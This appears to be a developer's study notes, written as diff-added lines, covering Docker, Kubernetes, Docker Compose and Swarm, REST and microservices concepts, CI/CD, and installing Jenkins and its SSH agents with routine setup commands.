+Docker is a container management system.
+It's designed to make it easier to create, deploy, and run applications by using containers.
+Containers package up an application with all the parts it needs.
+Containers allow applications to run on any Linux machine regardless of configuration.
+Applications run in a loosely isolated environment called a container.
+Containers are lightweight.
+
+DOCKER ENGINE:
+Docker Engine is a client-server application with 3 major components:
+    - The server runs as daemon process.
+    - REST API.
+    - A command line interface (CLI) client.
+
+COMMAND docker attach: Attach local standard input, output, and error streams to a running container. Once you de-attach from the container, it will terminate.
+COMMAND docker build: Build an image from a Dockerfile.
+COMMAND docker exec: Allows you to execute commands in a running container. It doesn't shutdown the container.
+COMMAND docker images: List images installed in docker server.
+COMMAND docker info: Display system-wide information.
+COMMAND docker inspect: Return low-level information about Docker objects.
+COMMAND docker logs: Fetch the logs of a container.
+COMMAND docker network: Manage networks (Create, delete, connect/disconnect containers).
+COMMAND docker node: Manage Swarm nodes.
+COMMAND docker ps: List running containers.
+COMMAND docker pull: Pull an image or a repository from a registry.
+COMMAND docker push: Push an image to a registry.
+COMMAND docker restart: Restart one or more containers.
+COMMAND docker rm: Remove one or more containers.
+COMMAND docker rmi: Remove one or more images.
+COMMAND docker run: Run a command in a new container.
+COMMAND docker start: Start one or more stopped containers.
+COMMAND docker stop: stop one or more running containers.
+COMMAND docker swarm: Manage swarm.
+COMMAND docker volume: Manage Docker volumes.
+
+
+[DOCKER IMAGES]
+A Docker image is a template. It's built up from a series of layers. Used to build a container.
+Each layer represents an instruction in the image's Dockerfile (either a command or entrypoint).
+Each layer is going to be a set of differences from the layer before it. They are stacked on stop of each other.
+Each layer except the very last one is read-only.
+
+CONTAINER AND LAYERS:
+Containers create a new writable layer on top of the underlying image layers. This is called the 'container layer'.
+The difference between a container and an image is the top writable layer.
+Data changes are stored in this writable container. When the container is deleted, the writable layer is also deleted. Image is intact.
+
+
+[DOCKER VOLUMES]
+Volumes are the preferred method to manage persistent data with Docker.
+The content within the volume exists outside of the container's life cycle.
+There are two ways of handling volumes when working with containers:
+    - Bind mounts.
+    - Volumes.
+
+You can use both the --mount and -v/--volume flags to mount bind mounts and volumes.
+
+
+[DOCKER NETWORKS]
+Drivers for our Docker hosts and containers determine their behavior on each host, as well as accessibility and routing to them.
+There are 5 different types of network drivers:
+    - Bridge.
+    - Host.
+    - Overlay.
+    - MACVlan.
+    - None.
+
+BRIDGE NETWORKS:
+Bridge network is a Link layer device. Forwards traffic between network segments.
+Can be a hardware device or a software device.
+When working with docker we use software bridge. Allows containers connected to the same bridge network to communicate with each other.
+Provides isolation from other containers not connected to the same bridge network.
+A default bridge network is created. Creating user-defined custom bridge networks is also possible.
+User-defined bridge networks are superior to the default bridge network. Linking containers on a user defined network is not going to share environment variables.
+
+OVERLAY NETWORKS:
+Creates a distributed network among multiple Docker daemon hosts. This network sits on top of (overlays) the host-specific networks.
+Overlay networks allow containers connected to the network to communicate securely.
+
+HOST NETWORKS:
+This is the Docker host network. This network stack is not isolated from the Docker host.
+A container which binds to port 80 will be available on port 80 on the host's IP address.
+
+MACVLAN NETWORK:
+The MACVlan network driver assign a MAC address to each container's virtual network interface.
+It gives the appearance of being on a physical network interface.
+A physical interface on the Docker host must be designated to use for the Macvlan.
+A subnet and gateway of the Macvlan must also be designated.
+
+
+[DOCKERFILES]
+A Dockerfile is a set of instructions for automatically building Docker images. It contains all the commands a user could call on the command line to assemble an image.
+The instructions are not case-sensitive. The instruction names should be UPPERCASE to distinguish them from arguments more easily.
+Instructions are run in order.
+Dockerfile must start with a 'FROM' instruction (base image to be used to build the new image).
+
+ENVIRONMENT VARIABLES:
+Environment variables are defined in this fashion: ${variable_name}.
+To set a new variable you use the ENV directive: ENV myvar myvalue.
+Environment variables are supported by the following list of instructions in the Dockerfile:
+    - ADD.
+    - COPY.
+    - ENV.
+    - EXPOSE.
+    - FROM.
+    - LABEL.
+    - STOPSIGNAL.
+    - USER.
+    - VOLUME.
+    - WORKDIR.
+
+DIRECTIVE FROM: Initializes a new build stage and sets the Base image for subsequent instructions.
+DIRECTIVE RUN: Executes any commands in a new layer on top of the current image and commit the results.
+DIRECTIVE CMD: Provides defaults for an executing container.
+DIRECTIVE LABEL: Adds metadata to an image.
+DIRECTIVE MAINTAINER: Sets the Author field of the generated images.
+DIRECTIVE EXPOSE: Informs Docker that the container listens on the specified network ports at runtime.
+DIRECTIVE ENV: Sets the environment variable KEY to the value VALUE.
+DIRECTIVE ADD: Copies new files, directories, or remote files to the Docker image.
+DIRECTIVE COPY: Copies new files or directories (but not remote files) to the Docker image.
+DIRECTIVE ENTRYPOINT: Allows you to configure a container that will run as an executable. This should be set at the end of the Dockerfile. If multiple are specified, only the last one is taken.
+DIRECTIVE VOLUME: Creates a mount point.
+DIRECTIVE USER: Sets the user name used to execute commands from the RUN directive.
+DIRECTIVE WORKDIR: Sets the working directory.
+DIRECTIVE ARG: Defines a variable that users can pass at built-time.
+
+
+[KUBERNETES]
+Kubernetes is an open source container orchestration tool. It was developed by Google.
+Kubernetes is container runtime-agnostic.
+Features provide everything needed for deploying containerized applications.
+    - Container deployments & Rollout control.
+    - Resource Bin Packing.
+    - Built-in service discovery & Autoscaling.
+    - Heterogeneous Clusters.
+    - Persistent storage.
+    - High availability features.
+
+[CONFIGURING KUBERNETES]
+Initialize Kubernetes Master.
+    kubeadm init --pod-network-cidr=10.24.0.0/16
+
+Set the kube config in user.
+    mkdir -p $HOME/.kube
+    sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
+    sudo chown $(id -u):$(id -g) $HOME/.kube/config
+
+Install Flannel:
+    kubectl -n kube-system apply -f https://raw.githubusercontent.com/coreos/flannel/bc79dd1505b0c8681ece4de4c0d86c5cd2643275/Documentation/kube-flannel.yml
+
+You can add other servers to join the cluster.
+    kubeadm join IP:PORT --token TOKEN --discovery-token-ca-cert-hash HASH
+
+Verify all nodes are set in the cluster. From master:
+    kubectl get nodes
+
+
+[KUBERNETES | PODS]
+A pod is the simplest building block within Kubernetes. Pods represents processes that are running on the cluster.
+They encapsulate application containers, store resources as well as the unique network IP.
+They represent a unit of a deployment, a single instance of an application within Kubernetes.
+To create a pod, we use the 'kubectl create' command followed by the '-f' flag and the definition file.
+    kubectl create -f pod.yml   # Creates a pod based on the definition file.
+
+COMMAND kubectl get pods:
+List any created pod.
+Structure:
+    kubectl get pods
+Example:
+    kubectl get pods    # Lists the pods.
+
+COMMAND kubectl delete:
+Delete a pod.
+Structure:
+    kubectl delete PODNAME
+Example:
+    kubectl delete my-pod       # Deletes the pod.
+
+
+[KUBERNETES | REPLICA SETS]
+By themself, you can't update replica sets.
+You can also create a replica set with the 'kubectl create -f FILE' command.
+    kubectl create -f replicaset.yml    # Creates a replica set based on the definition file.
+
+COMMAND kubectl get replicasets:
+List any created replica set.
+Structure:
+    kubectl get replicasets
+Example:
+    kubectl get replicasets    # Lists the replica sets.
+
+COMMAND kubectl scale:
+Scale a replica set with the replica number specified.
+Structure:
+    kubectl scale --replicas=NUMBER replicaset/REPLICASETNAME
+Example:
+    kubectl scale --replicas=4 replicaset/my-replicaset     # Scale my-replicaset to 4 replicas.
+
+COMMAND kubectl delete replicaset:
+Delete a replica set.
+Structure:
+    kubectl delete replicaset REPLICASETNAME
+Example:
+    kubectl delete replicaset my-replicaset       # Deletes the replica set.
+
+
+[KUBERNETES | DEPLOYMENTS]
+Deployments have a notion of lifecycle.
+You can also create a deployment with the 'kubectl create -f FILE' command.
+    kubectl create -f deployment.yml    # Creates a deployment based on the definition file.
+
+COMMAND kubectl get deployments:
+List any created deployment.
+Structure:
+    kubectl get deployments
+Example:
+    kubectl get deployments    # Lists the deployments.
+
+COMMAND kubectl scale:
+Scale a deployment with the replica number specified.
+Structure:
+    kubectl scale --replicas=NUMBER deployment/DEPLOYMENTNAME
+Example:
+    kubectl scale --replicas=4 deployment/nginx-deployment     # Scale nginx-deployment to 4 replicas.
+
+COMMAND kubectl delete deployment:
+Delete a deployment.
+Structure:
+    kubectl delete deployment DEPLOYMENTNAME
+Example:
+    kubectl delete deployment nginx-deployment       # Deletes the deployment.
+
+
+[DOCKER COMPOSE]
+Docker compose is a Docker tool that allows you to run multi-tier-container applications.
+With Docker Compose you use a YAML file where you configure the application services.
+
+Download Docker compose placing the file in /usr/local/bin/ directory.
+    curl -L https://github.com/docker/compose/releases/download/1.21.2/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose
+
+Add execution permissions.
+    chmod a+x /usr/local/bin/docker-compose
+
+Verify the Docker Compose version.
+    docker-compose --version
+
+The Docker Compose file can be either named as:
+    - docker-compose.yml.
+    - docker-compose-yaml.
+However, if you specify the flag '-f' the file can have any name.
+The command 'docker-compose create' is deprecated.
+
+COMMAND docker-compose build: It creates an image based on a Dockerfile.
+
+COMMAND docker-compose up:
+Start the application services based on the docker compose YAML file. The docker compose file needs to be present in the current directory if the -f flag is not specified.
+By default, it runs the containers in the foreground. To avoid that, you can specify the flag '-d'.
+
+COMMAND docker-compose start: Start an already created application.
+COMMAND docker-compose stop: Stop an already running application.
+
+COMMAND docker-compose rm:
+Deletes the containers created with Docker Compose.
+Flags:
+    - -f: Force the deletion (if they are running).
+
+COMMAND docker-compose ps: Display the current containers running by Docker Compose.
+COMMAND docker-compose images: Display a list of images associated to the containers managed by Docker Compose.
+COMMAND docker-compose logs: Display the logs from the containers.
+COMMAND docker-compose pause: Pause the containers managed by Docker Compose.
+COMMAND docker-compose unpause: Resume the containers managed by Docker Compose.
+COMMAND docker-compose down: Stop and remove all the resources (containers, networks, volumes, etc) created by Docker Compose.
+COMMAND docker-compose restart: Restart containers managed by Docker Compose.
+COMMAND docker-compose config: Perform verification of the docker-compose.yml file.
+
+
+[DOCKER SWARM]
+Docker Swarm is a clustering and scheduling tool for Docker container. It provides redundancy for failover.
+In a Docker Swarm, containers can be added or removed as demands changes.
+Cluster management is integrated with Docker Engine by default.
+Docker Swarm has a decentralized design. It uses a declarative service model.
+It allows scaling, and desired state reconciliation.
+It supports multi-host networking, service discovery and load balancing.
+Docker Swarm is secure by default, all containers within a swarm will use MTLS authentication.
+We can apply rolling updates.
+
+A Docker Swarm consists on multiple Docker hosts running in swarm mode.
+Nodes can be managers, workers, or both.
+Creating a service defines its optimal state. Docker works to maintain that desired state.
+
+NODES:
+A nodes is a Docker engine instance that participates in the swarm. There are two types of nodes:
+    - Manager nodes. They perform orchestration and cluster management. By default, managers are also configured to be workers, but this can be changed.
+    - Worker nodes. They perform the tasks within a swarm.
+
+TASK:
+A task is a Docker container running as part of a service. It's the atomic scaling unit of the swarm.
+
+SERVICE:
+A service is a task definition that is going to be executed on the manager or worker nodes.
+    - Replicated Service Model. This model is going to have a plural number of tasks to be replicated of the same service.
+    - Global Service Model. In this model, the swarm will run one task in every available node within the cluster.
+
+LOAD BALANCING:
+Docker Swarm uses Ingress Load Balancing.
+If you don't specify a publisher port, the Swarm manager will automatically assign it to the service.
+The range of available port for auto-assignation is from 30000 to 32767.
+
+COMMAND docker swarm init:
+Initialize a Docker Swarm. The node from which you run this command is going to be set as a swarm manager.
+Structure:
+    docker swarm init [OPTIONS]
+Example:
+    docker swarm init --advertise-addr 192.168.1.12 # Initialize the Docker Swarm using specified IP.
+
+COMMAND docker swarm join --token TOKEN MANAGERIP:MANAGERPORT: It will add the node to the swarm as a worker.
+COMMAND docker swarm update:
+Allows you to modify the swarm properties. Can be run only from a swarm manager.
+Example:
+    docker swarm update --autolock=true     # Modify the swarm to lock it.
+COMMAND docker swarm unlock-key: Display or generate a new unlock key.
+
+COMMAND docker node ls: Display all the swarm nodes.
+COMMAND docker node inspect NODE..: Display detailed information on one or more nodes. This command can olny be run on swarm managers.
+
+COMMAND docker service: Manage services.
+COMMAND docker service create: Create a service. Flags are almost identical to the ones in 'docker run' command.
+Example:
+    docker service create -p 8080:80 --replicas=2 --name=nginx-test nginx:latest    # Creates a service of 2 tasks on port 8080 using nginx latest image.
+    docker service create -p 8081:80 --mount source=swarm-vol,dest=/usr/share/nginx/html --replicas=2 --name=nging-vol nginx:latest # Creates a service of 2 tasks on port 8080 using a volume.
+COMMAND docker service ls: Lists the running services.
+COMMAND docker service update SERVICENAME: Updates the properties of a service.
+Example:
+    docker service update --replicas=1 nginx-test   # Updates the service to only have 1 task.
+COMMAND docker service scale SERVICE=REPLICANUMBER: Specify the number of replicas to have on the service.
+Example:
+    docker service scale nginx-test=4   # Updates the service to have 4 replicas/tasks.
+
+
+[DOCKER MACHINE]
+Docker Machine is a tool that lets you install Docker Engine on a virtual host and manage the host with docker machine commands. You can run it on MAC, Windows, or Linux.
+Docker Machine allows you to install Docker Engine on:
+    - Virtual hosts.
+    - Local system.
+    - Servers in your data center.
+    - Cloud providers.
+
+USES CASES:
+The ability to run Docker on Mac or Windows on older desktop systems.
+Provision Docker hosts on remote systems.
+
+docker-machine COMMANDS:
+    - start.
+    - inspect.
+    - stop.
+    - restart. Restarts a managed host.
+    - upgrade. Upgrade Docker.
+
+DOCKER MACHINE DRIVERS:
+    - Amazon Web Services. This allows you to provision a Docker host in AWS.
+    - Microsoft Azure. Allows you to provision a Docker host in Azure.
+    - Digital Ocean. Same but in Digital Ocean platform.
+    - Google Compute Engine. Same but in Google Cloud.
+    - Generic. Allows you to use a system in your data center (physical or virtual machine).
+    - Microsoft Hyper-V. In order to use this, you need to have Hyper-V enabled on your system. When Docker for Windows is used, this is enabled by default.
+    - OpenStack.
+    - Oracle VirtualBox.
+    - VMware vSphere
+
+To verify Docker Machine is installed you can display the version.
+    docker-machine version  # Display the Docker Machine version.
+
+INSTALLING DOCKER MACHINE IN MACOS:
+base=https://github.com/docker/machine/releases/download/v0.14.0 && curl -L $base/docker-machine-$(uname -s)-$(uname -m) > /usr/local/bin/docker-machine && chmod +x /usr/local/bin/docker-machine
+
+INSTALLING DOCKER MACHINE ON LINUX:
+base=https://github.com/docker/machine/releases/download/v0.14.0 && curl -L $base/docker-machine-$(uname -s)-$(uname -m) > /tmp/docker-machine && sudo install /tmp/docker-machine /usr/local/bin/docker-machine
+
+INSTALLING DOCKER MACHINE ON WINDOWS USING GIT CLI:
+base=https://github.com/docker/machine/releases/download/v0.14.0 && mkdir -p "$HOME/bin" && curl -L $base/docker-machine-Windows-x86_64.exe > "$HOME/bin/docker-machine.exe" && chmod +x "$HOME/bin/docker-machine.exe"
+
+To create a Docker Machine you use the 'docker-machine create' command.
+    docker-machine create -d virtualbox my-vbox     # Creates a virtualbox Docker Machine called my-vbox.
+
+To activate a Docker Machine use the next command:
+    eval $(docker-machine env my-vobx)      # Activates the Docker Machine.
+
+COMMAND docker-machine create:
+Creates a Docker Machine node. It doesn't active the created machine.
+Flags:
+    - -d DRIVER: Specify the driver to use.
+Structure:
+    docker-machine create [OPTIONS] MACHINENAME
+Example:
+    docker-machine create -d virtualbox my-vbox     # Creates a virtualbox Docker Machine called my-vbox.
+
+COMMAND docker-machine ls: List the created docker machines.
+COMMAND docker-machine active: List the active docker machines.
+COMMAND docker-machine config DOCKERMACHINE: Display the config information for the docker machine.
+COMMAND docker-machine inspect DOCKERMACHINE: Display in-depth information about the docker machine. In JSON format.
+COMMAND docker-machine provision DOCKERMACHINE: Re-provision existing machines.
+COMMAND docker-machine restart DOCKERMACHINE: Restart an existing docker machine.
+COMMAND docker-machine ssh DOCKERMACHINE: Allow you to ssh into the docker machine.
+COMMAND docker-machine status DOCKERMACHINE: Display the status of a docker machine.
+COMMAND docker-machine start DOCKERMACHINE: Start a running docker machine.
+COMMAND docker-machine stop DOCKERMACHINE: Stop a running docker machine.
+COMMAND docker-machine url DOCKERMACHINE: Display the Docker connection URL for the docker machine.
+COMMAND docker-machine ip DOCKERMACHINE: Display the IP of the docker machine.
+
+
+
+----------------------------------------------- SOFTWARE ENGINEERING -----------------------------------------------
+[RESTful APIs]
+REST stands for REpresentational State Transfer.
+It's an architectural style that allows computer systems on the web to communicate with one another in a standardized fashion.
+REST is stateless and separates the concerns of the client and the server. The client and server are independent from one another.
+A client can be a web-based UI or another REST API.
+RESTful systems are going to be stateless. This means the server doesn't need to know anything about the state of the client. And the reverse direction.
+
+NOUNS:
+Resources are the noun of the web. Nouns are nothing more than the URL path.
+The Nouns describe the object, document or the thing you need to store or send to another service.
+
+VERB:
+The kind of operation to be performed.
+
+REQUESTS AND RESPONSES:
+REST requires that a client make a request to the server.
+Send a request:
+    - HTTP verb. The operation to perform.
+    - Header. Allows the client to pass information along about the request.
+    - Resource path. The noun.
+    - Message body. Optional.
+
+Get a response:
+    - Content type. Text HTML, Application JSON, etc.
+    - Response code.
+
+HTTP VERBS:
+There are 4 basic HTTP verbs.
+    - GET: Reads data and doesn't change application state.
+    - POST: Creates resources and queries for data using conditions.
+    - PUT: Updates resources. An ID needs to be specified.
+    - DELETE: Removes resources from the database. An ID needs to be specified.
+CRUD: Create, Read, Update, Delete.
+
+HEADERS:
+The client sends the type of content that it's able to receive.
+    - Accept. The type of content expected to be returned (that can be accepted).
+            The Accept is going to take a MIME type:
+                - type/subtype.
+                - application/json.
+                - application/xml.
+
+PATHS:
+Requests must contain a path to a resource.
+Path should be the plural. Example:
+    - /customers
+Append an 'id' to the path when accessing a single resource
+    - /customers/:id
+    - /customers/:id/orders/:id
+
+STATUS CODES:
+200: OK: This is a successful request.
+201: Created: A resource has been created.
+202: Accepted: The request has been accepted but it hasn't been completed.
+204: No Content: Successful HTTP request, where nothing is being returned in the response body.
+400: Bad Request: The request wasn't understood by the server, due to malformed syntax.
+401: Unauthorized: Either the authentication header is missing, or it contains invalid credentials.
+403: Forbidden: The client doesn't have permissions to access this resource.
+404: Not Found: A resource matching the request doesn't exists.
+405: Method Not Allowed: The request operation is not supported on the specified Artifact type by the Services API.
+409: Conflict: This status code may be returned if you try to update an object while it's undergoing an asynchronous operation.
+500: Internal Server Error: An unhandled exception occurred on the server.
+
+VERBS AND SUCCESSFUL STATUS CODE:
+GET: Return 200. OK.
+POST: Return 201. Created.
+PUT: Return 200. OK.
+DELETE: Return 204. No content.
+
+REST EXAMPLE:
+Request:
+GET /customers/123
+Accept: application/json
+
+Response:
+Status Code: 200 (OK)
+Content-type: application/json
+{
+    "customer":{
+    "id": 123,
+    "firstname": "Bob",
+    "lastname": "Dobbs",
+    "email": "bdobbs@example.com"
+    }
+}
+
+
+[SERVICE-ORIENTED ARCHITECTURES]
+Service Oriented Architecture or SOA, it's an approach to create an architecture based of the use of services.
+Microservices are based of SOA.
+The services are exposed using standard network protocols, such as SOAP/HTTP or JSON/HTTP, to send requests to read or change data.
+SOA is an approach to distributed systems architecture. Where they consists of:
+    - Loosely coupled services.
+    - Standard interface and protocol.
+    - Seamless cross-platform integration.
+    - Communicates over an Enterprise Service Bus (ESB).
+
+A service has four properties:
+    - It logically represents a business activity with a specified outcome.
+    - It's self contained.
+    - It's a black box for its customers.
+    - It may consists of other underlying services.
+
+SOA PRINCIPLES:
+Standardized service contract.
+Service autonomy.
+Service discovery.
+Service reusability.
+Service encapsulation.
+
+SOA MANIFESTO:
+Business value is given more importance than technical strategy.
+Strategic goals are given more importance than project-specific benefits.
+Intrinsic inter-operability is given more importance than custom integration.
+Shared services are given more importance than specific-purpose implementations.
+Flexibility is given more importance than optimization.
+Evolutionary refinement is given more importance than pursuit of initial perfection.
+
+MONOLITHIC VS SOA VS MICROSERVICES.
+Monolithic:
+A monolithic application is a single unit. Everything is tightly coupled.
+
+Service-Oriented Architecture:
+SOA is referred to be coarse grained. It's loosely coupled.
+
+Microservices:
+They are fine-grained. They are also loosely coupled.
+
+
+[MICROSERVICES]
+A microservice architecture breaks an application up into a collection of small, loosely-coupled services.
+It's the opposite of the monolithic architecture.
+Microservices are small, each microservice is going to implement only a small piece of the application's overall functionality.
+Microservices are loosely coupled.
+Services should be fined-grained.
+Protocols should be lightweight.
+    - REST.
+    - Message queuing.
+
+There are many different ways to structure and organize a microservice architecture.
+Services are independent:
+    - Independent codebase.
+    - Independent running process.
+    - Built independently.
+    - Deployed independently.
+    - Scaled independently.
+
+Why use microservices:
+    - Modularity.
+    - Flexibility.
+    - Scalability.
+    - Maintainability.
+    - Small autonomous teams.
+    - Continuous refactoring.
+    - Enable continuous integration and continuous delivery.
+
+
+[AGILE]
+Agile is an approach for software development. It's conformed of a set of values and principles.
+The idea is to break down the silos between different organizations.
+Agile is going to advocate for:
+    - Adaptive planning.
+    - Evolutionary development.
+    - Early delivery.
+    - Continuous improvement.
+    - Rapid and flexible response to change.
+
+An iteration (a sprint in Scrum) is a period of time for doing things. Something is going to be produced at the end of the sprint.
+
+THE AGILE MANIFESTO:
+Individuals and interactions more than process and tools.
+Working software more than comprehensive documentation.
+Customer collaboration more than contract negotiation.
+Responding to change more than following a plan.
+
+
+[TEST DRIVEN DEVELOPMENT]
+Test Driven Developments, also known as TDD, is a software development process relying on software requirements being converted to test cases before software is fully developed, and tracking all software development by repeatedly testing the software against all test cases.
+This is opposed to software being developed first and test cases created later.
+It's a software development process that relies on the repetition of a very short development cycle.
+The developer writes an automated test case that defines a desired function. Then produces the minimum amount of code to pass that test. And later, refactors the new code to acceptable standards.
+
+TDD STEPS:
+    - Add a test. Write a "single" unit test describing an aspect of the program.
+    - Run all tests and see if the new one fails. Run the test, which should fail because the program lacks that feature.
+    - Write some code. Write "just enough" code, the simplest possible, to make the test pass.
+    - Run tests. Run tests to validate the code passes the test.
+    - Refactor code. Refactor code until it conforms to the simplicity criteria.
+    - Repeat. "Accumulating" unit tests over time.
+
+
+[CONTINUOUS INTEGRATION]
+Continuous integration (CI) is the development practice of frequently merging code changes done by developers.
+Continuous integration (CI) is a critical part of any DevOps pipeline.
+Code is merged constantly throughout the day.
+Automated tests are executed to verify the build.
+Rinse and repeat.
+
+HOW DOES IT LOOKS LIKE:
+Usually a CI server is involved.
+    - Jenkins.
+    - Hudson.
+    - CircleCI.
+A developer commits a code change.
+The CI server sees the change and automatically performs the build.
+Automated tests are executed against the build.
+Developers are notified if the build fails.
+
+WHY DO CONTINUOUS INTEGRATION:
+Early detection of certain types of bugs.
+Eliminate the scramble to integrate just before a big release.
+Makes frequent releases possible.
+Makes continuous testing possible.
+Encourages good coding practices.
+
+
+[CONTINUOUS DELIVERY & CONTINUOUS DEPLOYMENT]
+CONTINUOUS DELIVERY:
+Continuous delivery (CD) is the practice of continuously maintaining code in a deployable state. Code is always in a deployable state.
+Most of the time you can use the terms continuous delivery and continuous deployment interchangeably.
+
+CONTINUOUS DEPLOYMENT:
+Continuous deployment is the practice of frequently deploying small code changes to production. Code is always in a deployable state.
+Code is deployed to production frequently. Deploying code to production multiple times a day is common.
+Deployments to production are routine and commonplace.
+
+WHAT DOES CONTINUOUS DELIVERY & DEPLOYMENT LOOK LIKE:
+Code goes through a series of stages:
+    - Automated builds.
+    - Automated testing.
+    - Manual acceptance testing (QA).
+The result is a deployable artifact or package.
+Deployments to production is automated.
+The deploy can be rolled back using an automated process.
+
+WHY DO CONTINUOUS DELIVERY AND DEPLOYMENT:
+Faster time-to-market.
+Fewer problems caused by the deployment process.
+Lower risk.
+Reliable rollbacks.
+Fearless deployments.
+
+
+[JENKINS]
+Jenkins is a self-contained, open source automation tool.
+You can use Jenkins to automate:
+    - Building.
+    - Testing.
+    - Delivering.
+    - Deploying software.
+
+Jenkins has support for various version control tools:
+    - AccuRev.
+    - CVS.
+    - Subversion.
+    - Git.
+    - Mercurial.
+    - Perforce.
+    - ClearCase.
+    - RTC.
+
+HOW JENKINS WORKS:
+Jenkins is available as a Java 8 WAR file.
+Installer packages are available for most major OSs.
+The source code is mostly Java, with a few Groovy, Ruby, and Antlr file.
+
+ARTIFACT:
+An artifact is an immutable file that is generated by a build or pipeline when Jenkins runs.
+
+CORE:
+Core is the primary Jenkins application. The Jenkins WAR file. It provides the basic Web UI, configuration and foundation upon all plugins will be built on.
+
+DOWNSTREAM:
+Projects or pipelines triggered by your executing pipeline (Downstream pipelines or projects).
+
+FINGERPRINT:
+A hash, it's unique and used to track the usage of an artifact or other entities across multiple pipelines or projects.
+
+MASTER:
+The master node of Jenkins. The central coordinating process, which stores configurations, runs plugins and renders various UIs.
+
+NODE:
+Part of the Jenkins environment. A node is capable of executing pipelines or projects.
+Both masters and agents are considered nodes.
+
+PROJECT:
+A projects is a user-configured description of work in Jenkins (test code, deploy code, etc.).
+
+PIPELINE:
+A pipeline is a user defined model of a continuous pipeline. Similar to a Project but built for continuous delivery.
+
+PLUGINS:
+Jenkins functionality can be extended by the use of plugins.
+
+STAGE:
+A stage is a part of a pipeline. It's used to go and define distincts subsets of the entire pipeline (Build, test and deploy stages of a pipeline.).
+It's specifically geared towards a pipeline.
+
+STEP:
+A step is a single task. Tells Jenkins what to do inside of a pipeline or projects.
+Steps can be used in both pipelines and projects.
+
+UPSTREAM:
+The upstream project or pipeline is what trigger the downstream.
+
+WORKSPACE:
+A disposable directory on the file system of the node that is executing the work.
+A workspace is left alone once the work is completed. But you can defined to be cleaned up after work completing by defining it in the pipeline or project on the Jenkins master.
+
+JENKINS PLUGINS:
+    - Copy Artifact: Add a build step to copy an artifact from one project to another.
+    - Fingerprint: Generates a fingerprint as a build step, instead of waiting for the build to be completed.
+    - Docker pipeline: Allows you to build and use a docker container from a pipeline.
+    - Docker build and publish: Provides the ability to build a docker image using a Dockerfile, and publish the results (and tag it) to a Docker registry.
+    - Git: Used to pull code from GitHub or another Git system and work with that code on a project.
+
+
+[ARTIFACT REPOSITORIES]
+Artifacts repositories aren't unique to Jenkins, however this is something used with Jenkins when producing binary artifacts.
+The best is to use artifact repositories with version control (not for code, but for binary files).
+Artifact repositories are tools designed to optimize the download and storage of binary files.
+A binary repository is a software repository for packages, artifacts and their corresponding metadata.
+It stores binary files produced by an organization itself.
+    - Product releases.
+    - Nightly product builds.
+    - Third party binaries.
+
+Popular artifact repositories (both has their opensource and enterprise version.):
+    - Artifactory.
+    - Nexus.
+You can use them for different types of registries.
+
+ARTIFACTORY:
+JFrog Artifactory is a universal DevOps solution providing end-to-end automation and management of binaries and artifacts through the application delivery process that improves productivity across your development ecosystem.
+It enables freedom of choice supporting 25+ software build packages, all major CI/CD platforms, and DevOps tools you already use.
+Artifactory is Kubernetes ready supporting containers, Docker, Helm Charts, and is your Kubernetes and Docker registry and comes with full CLI and REST APIs customizable to your ecosystem.
+
+Artifactory provides package support for:
+    - Docker.
+    - YUM.
+    - APT.
+    - NPM.
+    - Maven.
+    - NuGet (similar to Ruby Gem server but for .NET).
+    - Ruby.
+    - Chef.
+    - Puppet.
+    - Python (PIP server).
+    - Git.
+    - PHP.
+    - Bower.
+    - Go.
+
+Artifactory provides support for build tools:
+    - Jenkins.
+    - Bamboo.
+    - TeamCity.
+    - Maven.
+    - Gradle.
+    - Ivy.
+    - Travis CI.
+    - Circle CI.
+    - TFS (TeamFoundationServer).
+
+Artifactory provides support for orchestration tools:
+    - Chef.
+    - Kubernetes.
+    - Helm (for Kubernetes deployment automation).
+    - Mesos.
+    - Puppet.
+    - Docker Swarm.
+
+Artifactory provides support for storage tools:
+    - AWS S3.
+    - Google Cloud Storage.
+    - Azure Blob Storage.
+
+NEXUS:
+Nexus package support:
+    - Maven/Java.
+    - NPM.
+    - NuGet.
+    - RubyGems.
+    - Docker.
+    - APT.
+    - YUM.
+    - Puppet.
+    - Chef.
+    - Docker.
+
+Nexus build tools:
+    - Hudson.
+    - Jenkins.
+    - Gradle.
+    - Ant.
+    - Maven.
+    - Ivy.
+
+Nexus ide support:
+    - Eclipse.
+    - IntelliJ
+
+
+[INSTALLING JENKINS]
+Install the repository.
+    wget -O /etc/yum.repos.d/jenkins.repo http://pkg.jenkins-ci.org/redhat/jenkins.repo
+    rpm --import https://jenkins-ci.org/redhat/jenkins-ci.org.key
+
+Install the Java and Jenkins packages.
+    yum install -y java
+    yum install -y jenkins
+
+Start the Jenkins service (for systemd systems use 'systemctl start jenkins.service').
+    service jenkins start
+
+Enable the Jenkins service at boot (for systemd systems, you can use "systemctl enable jenkins" command).
+    chkconfig jenkins
+
+Get the admin password.
+    cat /var/lib/jenkins/secrets/initialAdminPassword
+
+
+[INSTALLING JENKINS PLUGINS]
+In the Jenkins Web main page:
+    Manage Jenkins -> Manage plugins -> Available.
+
+Look for the plugins to install and click Install without restart.
+Check the box 'Restart Jenkins when installation is complete and no jobs are running'.
+
+To verify the plugins are installed you can go to the Web main page:
+    Manage Plugins -> Installed.
+
+Plugins used:
+    - AnsiColor.
+    - Copy Artifact
+    - Docker.
+    - Docker Slaves.
+    - CloudBees Docker Build and Publish.
+    - Fingerprint.
+    - NodeJS.
+
+
+[SETTING UP A JENKINS SLAVE]
+ON THE JENKINS SLAVE:
+Install first Java.
+    yum install -y java
+
+Create the Jenkins user.
+    useradd -d /var/lib/jenkins jenkins
+    su - jenkins
+
+Create an authorized_keys file.
+    cd /var/lib/jenkins
+    mkdir .ssh && chmod 700 .ssh/
+    touch authorized_keys && chmod 600 authorized_keys
+
+Create a password for the user Jenkins.
+    passwd jenkins
+
+ON THE JENKINS MASTER:
+Switch to Jenkins user and generate an ssh key.
+    su - jenkins
+    ssh-keygen
+
+Copy the public ID from the Master to the Slave.
+    ssh-copy-id jenkins@slave.example.com
+
+ON THE JENKINS WEB INTERFACE:
+Add the Jenkins slave.
+    Manage Jenkins -> Manage Nodes -> New Node -> Add a name, Select 'Permanent Agent' -> Ok.
+
+Fulfill the needed fields.
+    - No. executions: 2
+    - Remote root directory: /var/lib/jenkins
+    - Labels if needed.
+    - Needed usage.
+    - Launch method: Launch slave agents using SSH.
+        * Host: slave hostname.
+        * Credentials. Select Jenkins -> Kind -> SSH Username with private key. -> User: Jenkins
+                                                                                -> Private key: From the Jenkins master ~/.ssh
+    - Host key verification strategy: Manually trusted key verification strategy.
+Click save.
+
